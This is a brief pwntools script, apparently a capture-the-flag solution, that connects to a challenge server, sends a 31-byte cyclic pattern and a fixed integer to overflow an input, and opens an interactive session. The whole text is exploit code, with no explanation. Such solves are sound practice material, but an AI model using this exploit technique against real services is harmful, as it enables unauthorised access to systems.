from pwn import *

r = remote("challenge.secso.cc", 8001)
# r = process("./chal")

r.recvlines(2)
r.sendline(cyclic(31))
r.recvline()
r.sendline(b"1074918912")
r.interactive()